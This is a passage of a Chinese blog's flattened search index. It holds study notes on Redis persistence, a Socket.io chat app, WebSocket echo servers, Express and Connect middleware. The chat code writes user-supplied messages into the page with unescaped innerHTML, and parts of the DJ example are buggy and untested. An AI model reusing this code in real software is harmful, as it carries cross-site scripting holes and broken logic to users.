value2 ...]hget obj keyhmget obj key1 [key2] 每个 hash 可以存储 232 -1 键值对（40多亿） list123l(r)push listName value1 [value2 ...]l(r)pop listName 列表最多可存储 232 - 1 元素 (4294967295, 每个列表可存储40多亿) set 无序集合 123sadd setName value1 [value2 ...]smembers runoob 集合中最大的成员数为 2^32 - 1 (4294967295, 每个集合可存储40多亿个成员) zset 有序集合 skiplist 通俗易懂 ziplist顺序数据结构，适用数据集较小时 123zadd zsetName score(double) value1 [value2 ...]zrangebyscore zsetName min max //[min, max] HyperLogLog 基数计数 Btree(各位大佬们都学过了) bitmap 比较：Btree对于合并操作的时间复杂度不如bitmap，但是bitmap的空间复杂度为$O(max\\{a_{n}\\})$ 12345pfadd hllName value [value ...]pfcount hllName [hllName ...]pfmerge destkey sourcekey [sourcekey ...] redis 持久化 将内存存入硬盘的策略 RDB以snapshot形式，每隔特定时间间隔将数据集快照写入磁盘 save触发(abandoned) ​ 执行save期间，阻塞redis bgsave触发 ​ 非阻塞，fork出程序 配置触发条件 ​ 由系统决定 save ​ save m n m秒内数据集存在n次修改时，自动触发bgsave ​ 启用RDB后默认启用 默认配置: save 900 1 &amp;&amp; save 300 10 &amp;&amp; save 60 10000 (并发执行) stop-weites-on-bgsave-error ​ 启用RDB后默认启用，当后台保存数据失败时， rdbcompression ​ 启用RDB后默认启用，压缩存储快照LZF rdbchecksum ​ 启用RDB后默认启用，存取快照后使用CRC64进行数据校验 dbfilename ​ 设置快照的文件名 dir ​ 快照的存放路径 (照抄网上) ①、优势 （1）RDB文件紧凑，全量备份，非常适合用于进行备份和灾难恢复。 （2）生成RDB文件的时候，redis主进程会fork()一个子进程来处理所有保存工作，主进程不需要进行任何磁盘IO操作。 （3）RDB 在恢复大数据集时的速度比 AOF 的恢复速度要快。 ②、劣势 RDB快照是一次全量备份，存储的是内存数据的二进制序列化形式，存储上非常紧凑。当进行快照持久化时，会开启一个子进程专门负责快照持久化，子进程会拥有父进程的内存数据，父进程修改内存子进程不会反应出来，所以在快照持久化期间修改的数据不会被保存，可能丢失数据。 AOF以log形式，将一个个的命令记录入文件 always ​ 同步日志 everysec ​ 每秒记录(同一秒内宕机，一秒间的数据丢失) no ​ 不可控，从不同步(依赖os的写入) (照抄) 1、优点 （1）AOF可以更好的保护数据不丢失，一般AOF会每隔1秒，通过一个后台线程执行一次fsync操作，最多丢失1秒钟的数据。（2）AOF日志文件没有任何磁盘寻址的开销，写入性能非常高，文件不容易破损。 （3）AOF日志文件即使过大的时候，出现后台重写操作，也不会影响客户端的读写。 （4）AOF日志文件的命令通过非常可读的方式进行记录，这个特性非常适合做灾难性的误删除的紧急恢复。比如某人不小心用flushall命令清空了所有数据，只要这个时候后台rewrite还没有发生，那么就可以立即拷贝AOF文件，将最后一条flushall命令给删了，然后再将该AOF文件放回去，就可以通过恢复机制，自动恢复所有数据 2、缺点 （1）对于同一份数据来说，AOF日志文件通常比RDB数据快照文件更大 （2）AOF开启后，支持的写QPS会比RDB支持的写QPS低，因为AOF一般会配置成每秒fsync一次日志文件，当然，每秒一次fsync，性能也还是很高的 （3）以前AOF发生过bug，就是通过AOF记录的日志，进行数据恢复的时候，没有恢复一模一样的数据出来。 文件重写 防止文件过大，使用bgreweiteaof，将内存中的数据以命令方式保存到临时文件，同时fork出一条新进程将文件重写 可以减小log的体积(减少不必要的命令，压缩可以压缩的命令) laravel配置 php的redis扩展 使用1redis::somecommand //redis的命令","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"11.Socket.io","date":"2020-09-29T11:16:24.000Z","path":"2020/09/29/coding/nodeJs/11. socket.io/","text":"Socket.io 提供了很好的灵活性，并非完全基于WebSocket =&gt; 可以在大多数设备上运行 聊天程序初始化程序123456789&#123; \"name\": \"chat.io\", \"version\": \"0.0.1\", \"dependencies\": &#123; \"body-parser\": \"^1.19.0\", \"express\": \"^4.17.1\", \"socket.io\": \"^2.3.0\" &#125;&#125; 构建服务器123456789101112131415161718/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123;extended: true&#125;));app.listen(3000); 将Socket.io绑定到服务器上 12345var io = sio.listen(httpServer);io.sockets.on('connection', function (socket) &#123; console.log('Someone connected');&#125;) 构建客户端public/index.html 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Socket.IO chat&lt;/title&gt; &lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script src=\"./chat.js\"&gt;&lt;/script&gt; &lt;link href=\"./chat.css\" rel=\"stylesheet\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"chat\"&gt; &lt;ul id=\"message\"&gt; &lt;form id=\"form\"&gt; &lt;input type=\"text\" id=\"input\" /&gt; &lt;button&gt;Send&lt;/button&gt; &lt;/form&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; public/chat.js 12345window.onload = function() &#123; //本例中，因为没有传递参数给io.connect，所以，它会尝试向页面所在的主机发起连接 //socket.io会使用适合当前浏览器的最优选择进行socket连接 var socket = io.connect();&#125; 事件与广播广播中加入用户信息public/chat.css 1234#chat &#123; /*将聊天窗口隐藏，登录后显示*/ display: none;&#125; public/chat.js 123456socket.on('connect', function () &#123; //通过join事件发送昵称 socket.emit('join', prompt('What is your nickname?')); document.getElementById('chat').style.display = 'block';&#125;) server.js 12345678io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function(name) &#123; socket.nickname = name; //这里直接调用socket.emit，只会把消息返回那个客户端，这里要的是广播给所有其他的用户 socket.broadcast.emit('announcement', name + ' joined the chat.'); &#125;);&#125;); 广播聊天信息public/chat.js 12345678910111213141516171819202122232425262728293031323334353637383940window.onload = function () &#123; var socket = io.connect(); socket.on('connect', function () &#123; socket.emit('join', prompt('What is your nickname?')); document.getElementById('chat').style.display = 'block'; //通知其他用户信息的事件 socket.on('announcement', function (msg) &#123; var li = document.createElement('li'); li.className = 'announcement'; li.innerHTML = msg; document.getElementById('messages').appendChild(li); &#125;) &#125;); //添加消息(li)元素 function addMessage (from, text) &#123; var li = document.createElement('li'); li.className = 'message'; li.innerHTML = '&lt;b&gt;' + from + '&lt;/b&gt;:' + text; document.getElementById('messages').appendChild(li); &#125; var input = document.getElementById('input'); document.getElementById('form').onsubmit = function () &#123; //添加用户自身的信息 addMessage('me', input.value); socket.emit('text', input.value); input.value = ''; input.focus(); return false; &#125; //addMessage是 text-接收 事件的响应回调函数 socket.on('text', addMessage);&#125; server.js 123456789101112131415161718192021222324252627282930313233343536/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123; extended: true &#125;));var httpServer = http.createServer(app);var io = sio.listen(httpServer);io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function(name) &#123; socket.nickname = name; //这里直接调用socket.emit，只会把消息返回那个客户端，这里要的是广播给除了自己以外所有其他的用户 socket.broadcast.emit('announcement', name + ' joined the chat.'); &#125;); socket.on('text', function (msg) &#123; //第一个参数是事件名，后面的参数都是给回调函数的 socket.broadcast.emit('text', socket.nickname, msg); &#125;);&#125;);httpServer.listen(3000); 改进用户体验，增加反馈server.js 12345678910111213141516171819202122232425262728293031323334353637/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123; extended: true &#125;));var httpServer = http.createServer(app);var io = sio.listen(httpServer);io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function(name) &#123; socket.nickname = name; socket.broadcast.emit('announcement', name + ' joined the chat.'); &#125;); socket.on('text', function (msg, fn) &#123; socket.broadcast.emit('text', socket.nickname, msg); //确认事件已接收 fn(Date.now()); &#125;);&#125;);httpServer.listen(3000); public/char.js 123456789101112131415161718192021222324252627282930313233343536373839404142window.onload = function () &#123; var socket = io.connect(); socket.on('connect', function () &#123; socket.emit('join', prompt('What is your nickname?')); document.getElementById('chat').style.display = 'block'; socket.on('announcement', function (msg) &#123; var li = document.createElement('li'); li.className = 'announcement'; li.innerHTML = msg; document.getElementById('messages').appendChild(li); &#125;) &#125;); function addMessage (from, text) &#123; var li = document.createElement('li'); li.className = 'message'; li.innerHTML = '&lt;b&gt;' + from + '&lt;/b&gt;:' + text; document.getElementById('messages').appendChild(li); //将li对象返回回去，以实现修改 return li; &#125; var input = document.getElementById('input'); document.getElementById('form').onsubmit = function () &#123; var li = addMessage('me', input.value); //第二个参数不是回调函数，而是给事件发送的第二个参数 socket.emit('text', input.value, function (date) &#123; li.className = 'confirmed'; li.title = date; &#125;); input.value = ''; input.focus(); return false; &#125; socket.on('text', addMessage);&#125; 轮流做DJ - 聊天程序扩展需求 服务器初始选择一名DJ DJ有权利请求 查询API，获取查询结果，选择一首歌，然后将这首歌广播给所有其他听众 当DJ离开时，系统会开放DJ人选 给下一名用户 扩展聊天应用server,js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123; extended: true &#125;));var httpServer = http.createServer(app);var io = sio.listen(httpServer);var currentSong, dj;/** * 1. 将当前用户选为dj * 2. 分发公告给其他人DJ已经选取完毕 * 3. 分发elected事件，让dj知道自己被选中了 * 4. 当dj断开连接时，将dj的名额留给下一位进来的人 * @param &#123;Object&#125; socket */function elect (socket) &#123; dj = socket; //向所有人发出通知 -- 注意区别 io.sockets.emit('announcement', socket.nickName + ' is the new dj'); //向单个用户发出通知 -- 注意区别 socket.emit('elected'); socket.dj = true; socket.on('disconnect', function () &#123; dj = null; io.sockets.emit('announcement', 'the dj left - next one to join become dj'); &#125;);&#125;io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function(name) &#123; socket.nickname = name; //向除了这个用户以外的其他人发送通知 -- 注意区别 socket.broadcast.emit('announcement', name + ' joined the chat.'); if(!dj) &#123; //如果没有dj就选择一名dj elect(socket); &#125; else &#123; //如果dj正在搓碟就向这个用户发送目前的歌名 socket.emit('song', currentSong); &#125; &#125;); socket.on('text', function (msg, fn) &#123; socket.broadcast.emit('text', socket.nickname, msg); fn(Date.now()); &#125;);&#125;);httpServer.listen(3000); puiblic/index.html 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Socket.IO chat&lt;/title&gt; &lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt; &lt;script src=\"./chat.js\"&gt;&lt;/script&gt; &lt;link href=\"./chat.css\" rel=\"stylesheet\" /&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"playing\"&gt;&lt;/div&gt; &lt;form id=\"dj\"&gt; &lt;h3&gt;Search songs&lt;/h3&gt; &lt;input type=\"text\" id=\"s\" /&gt; &lt;ul id=\"results\"&gt;&lt;/ul&gt; &lt;button type=submit&gt;Search&lt;/button&gt; &lt;/form&gt; &lt;div id=\"chat\"&gt; &lt;ul id=\"messages\"&gt; &lt;form id=\"form\"&gt; &lt;input type=\"text\" id=\"input\" /&gt; &lt;button&gt;Send&lt;/button&gt; &lt;/form&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 集成Grooveshark API(由于不能翻墙，所以不能测试代码的正确性) 添加superagent 1npm install superagent server.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677/** * 模块依赖 */var express = require('express'), sio = require('socket.io'), bodyParser = require('body-parser'), http = require('http'), request = require('superagent');/** * 创建app */app = express();app.use(express.static('public'));app.use(bodyParser.urlencoded(&#123; extended: true &#125;));var httpServer = http.createServer(app);var io = sio.listen(httpServer);var currentSong, dj;var apiKey = '&#123;your API key&#125;';/** * 1. 将当前用户选为dj * 2. 分发公告给其他人DJ已经选取完毕 * 3. 分发elected事件，让dj知道自己被选中了 * 4. 当dj断开连接时，将dj的名额留给下一位进来的人 * @param &#123;Object&#125; socket */function elect(socket) &#123; dj = socket; io.sockets.emit('announcement', socket.nickName + ' is the new dj'); socket.emit('elected'); socket.dj = true; socket.on('disconnect', function () &#123; dj = null; io.sockets.emit('announcement', 'the dj left - next one to join become dj'); &#125;);&#125;io.sockets.on('connection', function (socket) &#123; console.log('Someone connected'); socket.on('join', function (name) &#123; socket.nickname = name; socket.broadcast.emit('announcement', name + ' joined the chat.'); if (!dj) &#123; elect(socket); &#125; else &#123; socket.emit('song', currentSong); &#125; &#125;); socket.on('text', function (msg, fn) &#123; socket.broadcast.emit('text', socket.nickname, msg); fn(Date.now()); &#125;); //搜索的功能(事件分发) socket.on('search', function (q, fn) &#123; request('http://tinysong.com/s/' + encodeURIComponent(q) + '?key=' + apiKey + '&amp;format=json', function (res) &#123; if (200 == res.status) fn(JSON.parse(res.text)); &#125;); &#125;); //通知其他人正在播放的歌曲 socket.on('song', function () &#123; if (socket.dj) &#123; currentSong = song; socket.broadcast.emit('song', song); &#125; &#125;);&#125;);httpServer.listen(3000); public/chat.css 1234567#results a &#123; display: none;&#125;form.isDJ #results a &#123; display: none;&#125; public/chat.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586window.onload = function () &#123; var socket = io.connect(); socket.on('connect', function () &#123; socket.emit('join', prompt('What is your nickname?')); document.getElementById('chat').style.display = 'block'; socket.on('announcement', function (msg) &#123; var li = document.createElement('li'); li.className = 'announcement'; li.innerHTML = msg; document.getElementById('messages').appendChild(li); &#125;) &#125;); function addMessage(from, text) &#123; var li = document.createElement('li'); li.className = 'message'; li.innerHTML = '&lt;b&gt;' + from + '&lt;/b&gt;:' + text; document.getElementById('messages').appendChild(li); //将li对象返回回去，以实现修改 return li; &#125; var input = document.getElementById('input'); document.getElementById('form').onsubmit = function () &#123; var li = addMessage('me', input.value); //第二个参数不是回调函数，而是给事件发送的第二个参数 socket.emit('text', input.value, function (date) &#123; li.className = 'confirmed'; li.title = date; &#125;); input.value = ''; input.focus(); return false; &#125; socket.on('text', addMessage); //search form var form = document.getElementById('dj'); var results = document.getElementById('results'); form.style.display = 'block'; form.onsubmit = function () &#123; results.innerHTML = ''; socket.emit('search', document.getElementById('s').value, function (songs) &#123; for (var i = 0, l = songs.length; i &lt; l; i++) &#123; (function (song) &#123; var result = document.createElement('li'); result.innerHTML = song.ArtistName + ' - &lt;b&gt;' + song.SongName + '&lt;/b&gt; '; var a = document.createElement('a'); a.href = '#'; a.innerHTML = 'Select'; a.onclick = function () &#123; socket.emit('song', song); play(song); return false; &#125;; result.appendChild(a); results.appendChild(result); &#125;)(song[i]); &#125; &#125;); return false; &#125;; socket.on('elected', function () &#123; form.className = 'isDJ'; &#125;); var playing = document.getElementById('playing'); function play(song) &#123; if(!song) return; playing.innerHTML = '&lt;hr&gt;&lt;b&gt;Now Playing: &lt;/b&gt; ' + song.ArtistName + ' ' + song.SongName + '&lt;br&gt;'; var iframe = document.createElement('iframe'); iframe.frameborder = 0; iframe.src = song.Url; playing.appendChild(iframe); &#125;&#125;","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"10.WebSocket","date":"2020-09-29T11:15:24.000Z","path":"2020/09/29/coding/nodeJs/10. WebSocket/","text":"WebSocket注解：书中使用的WebSocket.io已经是8年未动的过时项目了，因此这里的所有内容使用的均为ws 使用ws模块 客户端 12345678910//WebSocket实例化var ws = new WebSocket(\"ws://localhost:8181\");ws.onopen = function (e) &#123; //成功连接服务器回调 console.log('客户端（client）：与服务器的连接已打开')&#125;function sendMessage() &#123; ws.send($('#message').val());&#125;; 服务端 12345678var WebSocketServer = require('ws').Server;var wss = new WebSocketServer(&#123;port: 8181&#125;);wss.on('connection', function (ws) &#123; console.log('服务器端：客户端已连接'); ws.on('message', function(message) &#123; console.log(message); &#125;);&#125;); 一个ECHO实例初始化项目package.json 12345678910&#123; \"name\": \"ws-echo\", \"version\": \"0.0.1\", \"dependencies\": &#123; \"bufferutil\": \"^4.0.1\", \"express\": \"*\", \"utf-8-validate\": \"^5.0.2\", \"ws\": \"*\" &#125;&#125; 服务端这里的ws服务器与express服务器是两个端口，其之间是分离的 123456789101112131415161718192021222324252627282930var express = require('express');/** * 启动服务 */var app = express();var WebSocketServer = require('ws').Server;var wss = new WebSocketServer(&#123; port: 3000&#125;);//静态托管app.use(express.static('public'));/** * 监听连接 */wss.on('connection', function (ws) &#123; ws.on('message', function (msg) &#123; console.log(' \\033[96mgot:\\033[39m ' + msg); ws.send('pong'); &#125;);&#125;);/** * 监听端口 */app.listen(8080); 客户端1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;WebSocket echo test&lt;/title&gt; &lt;script&gt; var lastMessage;//储存延时的变量 window.onload = function () &#123; //创建socket var ws = new WebSocket('ws://localhost:3000'); //建立第一次连接时触发 ws.onopen = function () &#123; //发送第一条pong ping(); &#125;; //返回数据时触发 //计算延时，并且再发出一条信息 ws.onmessage = function (ev) &#123; console.log(' got: ' + ev.data); //获得返回数据，测量延迟 document.getElementById('latency').innerHTML = new Date - lastMessage; //ping again ping(); &#125; function ping() &#123; //记录时间戳 lastMessage = +new Date; //发送消息 ws.send('ping'); &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;WebSocket Echo&lt;/h1&gt; &lt;h2&gt;Latency: &lt;span id=\"latency\"&gt;&lt;/span&gt;ms&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; 自制-共享端口123456789101112131415161718192021222324252627282930313233343536373839var express = require('express');var http = require('http');/** * 启动服务 */var app = express();var WebSocketServer = require('ws').Server;var wss = new WebSocketServer(&#123; noServer: true&#125;);//静态托管app.use(express.static('public'));/** * 监听连接 */wss.on('connection', function (ws) &#123; ws.on('message', function (msg) &#123; console.log(' \\033[96m got:\\033[39m ' + msg); ws.send('pong'); &#125;);&#125;);var server = http.createServer(app);//socket是http的更高一层，所以使用upgrade事件server.on('upgrade', function upgrade(req, socket, head) &#123; console.log(\"received\"); wss.handleUpgrade(req, socket, head, function done (ws) &#123; wss.emit('connection', ws, req); &#125;)&#125;)/** * 监听端口 */server.listen(3000);","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"9.Express","date":"2020-09-29T11:14:24.000Z","path":"2020/09/29/coding/nodeJs/9. express/","text":"Express一个小型express应用创建模块123456789&#123; \"name\": \"express-tweet\", \"version\": \"0.0.1\", \"dependencies\": &#123; \"express\": \"*\", \"ejs\": \"*\", \"superagent\": \"*\" &#125;&#125; ejs./view/index.ejs 1234567&lt;h1&gt;Twitter app&lt;/h1&gt;&lt;p&gt;Please enter your search term:&lt;/p&gt;&lt;form action=&quot;/search&quot; method = &quot;GET&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;q&quot; /&gt; &lt;button&gt;SEARCH&lt;/button&gt;&lt;/form&gt; ./view/search.ejs 1234567891011&lt;h1&gt;Tweet results for &lt;%= search %&gt;&lt;/h1&gt;&lt;!--我们将JavaScript代码嵌在标签中，通过在标签之后加入=来将变量值打印出来--&gt;&lt;% if (results.length) &#123; %&gt; &lt;ul&gt; &lt;% for (var i = 0; i &lt; results.length; i++) &#123; %&gt; &lt;li&gt;&lt;%= results[i].text %&gt; - &lt;em&gt;&lt;%= results[i].from_user %&gt;&lt;/em&gt;&lt;/li&gt; &lt;% &#125; %&gt; &lt;/ul&gt;&lt;% &#125; else &#123; %&gt; &lt;p&gt;No results&lt;/p&gt;&lt;% &#125; %&gt; jsserver.js 12345678910111213141516171819202122232425262728293031323334/** * 模块依赖 */var express = require(&apos;express&apos;);//创建服务 - 自己修改过，书上是老版本的用法var app = express();//指定模板引擎app.set(&apos;view engine&apos;, &apos;ejs&apos;);//指定视图文件所在的路径app.set(&apos;views&apos;, __dirname + &apos;/views&apos;);//视图文件选项app.set(&apos;view options&apos;, &#123;layout: false&#125;);/** * 路由 */app.get(&apos;/&apos;, function(req, res) &#123; /* Express为response对象提供了render方法，该方法完成了下面的三件事: 1. 初始化模板引擎 2. 读取视图文件并将其传递给模板引擎 3. 获取解析后的HTML页面并作为响应发送给客户端 */ res.render(&apos;index&apos;);&#125;)/** * 监听 */app.listen(3000); 路由example 123456789101112131415161718192021222324//路由示例app.get('/', function (req, res, next)&#123; //sth&#125;)//:name 匹配参数，id值不同也能匹配到app.put('/post/:name', function (req, res, next)&#123; //sth&#125;)app.post('/signup', function (req, res, next)&#123; //sth&#125;)app.del('/user/:id', function (req, res, next)&#123; //sth&#125;)app.patch('/user/:id', function (req, res, next)&#123; //sth&#125;)app.head('/user/:id', function (req, res, next)&#123; //sth&#125;) 查询路由 123456789101112var search = require('./search');/*...*/app.get('/search', function (req, res, next) &#123; search(req.query.q, function (err, tweets) &#123; //如果报错就把错传递下去 if (err) return next(err); //render给ejs传参(json)，这里的变量成为本地变量，因为其内容只对其传递的视图可见 res.render('search', &#123; results: tweets, search: req.query.q &#125;); &#125;)&#125;) 最终的server123456789101112131415161718192021222324252627282930313233343536373839404142/** * 模块依赖 */var express = require('express');var search = require('./search');//创建服务var app = express();//指定模板引擎app.set('view engine', 'ejs');//指定视图文件所在的路径app.set('views', __dirname + '/views');//视图文件选项app.set('view options', &#123; layout: false &#125;);/** * 路由 */app.get('/', function (req, res) &#123; /* Express为response对象提供了render方法，该方法完成了下面的三件事: 1. 初始化模板引擎 2. 读取视图文件并将其传递给模板引擎 3. 获取解析后的HTML页面并作为响应发送给客户端 */ res.render('index');&#125;)app.get('/search', function (req, res, next) &#123; search(req.query.q, function (err, tweets) &#123; //如果报错就把错传递下去 if (err) return next(err); //render给ejs传参(json)，这里的变量成为本地变量，因为其内容只对其传递的视图可见 res.render('search', &#123; results: tweets, search: req.query.q &#125;); &#125;)&#125;)/** * 监听 */app.listen(3000); 查询search.js 12345678910111213141516171819202122/** * Search function. * * @param (String) search query * @param (Function) callback * @api public */var request = require('superagent');module.exports = function search(query, fn) &#123; request.get('http://search.twitter.com/search.json') .send(&#123; q: query &#125;) .end(function (res) &#123; if (res.body &amp;&amp; Array.isArray(res.body.results)) &#123; //如果superagent获取到了json格式的信息，他会自动解码放到body中 return fn(null, res.body.results); &#125; else &#123; fn(new Error('Bad twitter response')); &#125; &#125;)&#125; 一些express设置 缓存模板引擎 1app.enable('view cache', true); 模板引擎 Haml Jade ejs CoffeeKup jQuery Templates for node 错误处理 将错误参数通过next传递下去，通常express会展示一个错误页面并且发送500状态码 自定义错误处理 12345678910// error handlerapp.use(function(err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get('env') === 'development' ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render('error'); &#125;); 方便的函数request 1req.header(sth); //返回头部的信息 e.g: 1console.log(req.header('HoSt')); //不区分大小写 1req.accepts('text/html'); //分析请求中的Accept头信息，根据值返回true / false 1req.is('text/html'); //与accepts类似，但是它会检查Content-Type头信息 response 1res.render(filename); //渲染文件，路径在views设置中( app.set('views', __dirname + '/views'); ) 12345//经测试，响应会在send之后结束res.send(Number); //发送状态码res.send(Object); //发送对象(被解析为JSON字符串)res.send(Array); //发送数组(被解析为字符串)res.send(String); //发送字符串 1res.redirect(path(, Number)); //等效于发送302状态码以及Location头信息，第二个参数允许自己设置状态码 路由 路由传参，变量被注入到req.params中 123app.get('/example/:name', function (req, res, next) &#123; res.send(req.params.name);//字符串类型&#125;); 还可以加问号表示可选 123app.get('/example/:name?', function (req, res, next) &#123; res.send(req.params.name);//字符串类型&#125;); 还可以使用RegExp对象(正则表达式)进行匹配 123app.get( /^\\/post\\/([a-z\\d\\-]*)/ , function (req, res, next) &#123; res.send('success');&#125;); 在路由中使用next，可以跳过这个路由，让其他路由进行处理 123456app.get('/search/:name', function (req, res, next) &#123; if(req.params.name == \"f**k\") return next();&#125;);app.get('/search/f**k', function (req, res, next) &#123; //do sth if the route is /search/f**k&#125;); 同时也可以next(err)来传递错误 在中间件中使用next(&#39;route&#39;)，可以确保当前路由被跳过 中间件 1app.use(func); 1234567891011//在特定的路由中使用中间件function secure (req, res, next) &#123; //do sth&#125;app.get('/financials', secure, function (req, res, next) &#123; //do sth&#125;);//也可以定义多个中间件app.get('/route', a, b, c, function(req, res, next) &#123; //do sth&#125;); 代码组织策略 模块化 -第一准则 维护一个server.js文件，该文件包含了路由表，同时将每一部分路由处理器都通过模块化的方式引入 app挂载 将整个express的app作为一个模块，并且挂载到现有应用中 var app = module.exports = express() e.g: ```js//blog.js中var app = module.exports = require(‘express’)();/** 路由*/app.get(‘/‘, function (req, res, next) { //do sth})app.get(‘/categories’, function (req, res, next) { //do sth})app.get(‘/search’, function (req, res, next) { //do sth})123456789- ```js //主程序中 app.use((path, )require(&apos;./blog&apos;)); /*path: 可选参数，前置路径 e.g: app.use((&apos;/blog&apos;, )require(&apos;./blog&apos;)); 则url为 /blog/ /blog/categories /blog/search */","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"8.connect","date":"2020-09-29T11:13:24.000Z","path":"2020/09/29/coding/nodeJs/8. connect 中间件/","text":"connect 基于HTTP服务器的工具集，提供了一种新的组织代码的方式来与请求，响应对象进行交互，称中间件(middleware) 比较-原生http与connect 原生http 1234567891011121314151617181920212223242526var http = require('http'), fs = require('fs');var server = http.createServer(function (req, res) &#123; if ('GET' == req.method &amp;&amp; '/images' == req.url.substr(0, 7) &amp;&amp; '.jpg' == req.url.substr(-4)) &#123; fs.stat(__dirname + req.url, function (err, stat) &#123; if (err || !stat.isFile()) &#123; res.writeHead(404); res.end('Not Found'); return; &#125; serve(__dirname + req.url, 'application/jpg', res); &#125;); &#125; else if ('GET' == req.method &amp;&amp; '/' == req.url) &#123; serve(__dirname + '/index.html', 'text/html', res); &#125; else &#123; res.writeHead(404); res.end('Not Found'); &#125;&#125;)function serve(path, type, res) &#123; res.writeHead(200, &#123; 'Content-Type': type &#125;); //HTTP响应对象是只写的，从文件创建出来的流是只读的 fs.createReadStream(path).pipe(res);&#125;server.listen(3000); connect package.json 1234567&#123; \"name\": \"my-website\", \"version\": \"0.0.1\", \"dependencies\": &#123; \"connect\": \"*\" &#125;&#125; 代码 1234567891011121314151617181920212223/** * 模块依赖 *///书上的是旧版的connect( &lt; 3.0.0)的使用方法，自己摸索出了新版的使用方法var connect = require('connect');var serveStatic = require('serve-static')/** * 创建服务器 */var server = connect();/** * 处理静态文件 *///通过use方法添加static中间件//e.g:使用127.0.0.1:3000/images/example4.jpg访问./website/images/example4.jpgserver.use(serveStatic(__dirname + '/website'));/** * 监听 */server.listen(3000);//Connect还可以自己处理404的情况 设计一个更大型的应用需求 记录请求处理时间 托管静态文件 处理授权 代码1234567891011121314151617181920212223242526272829303132333435var server = require('connect')();//在中间件同时处理路由，返回数据，兼当控制器的作用//一些地方没有具体实现server.use(function (req, res, next) &#123; //记录日志 console.error(' %s %s ', req.method, req.url); next();&#125;);server.use(function (req, res, next) &#123; if('GET' == req.method &amp;&amp; '/images' == req.url.substr(0, 7)) &#123; //托管图片 &#125; else &#123; //交给其他中间件处理 next(); &#125;&#125;);server.use(function (req, res, next) &#123; if('GET' == req.method &amp;&amp; '/' == req.url) &#123; //响应index.html文件 &#125; else &#123; //交给其他中间件处理 next(); &#125;&#125;);server.use(function (req, res, next) &#123; //最后一个中间件，如果到了这里，就意味着无能为力，返回404 res.writeHead(404); res.end('Not Found');&#125;);server.listen(3000); 中间件-编写可重用的中间件 一个用于当请求时间过长而进行警告的中间件 request-time.js 暴露一个函数，暴露的函数本身返回一个函数 - 一个对于可配置的中间件来说很常见的写法 框架 12345678910111213141516/** * 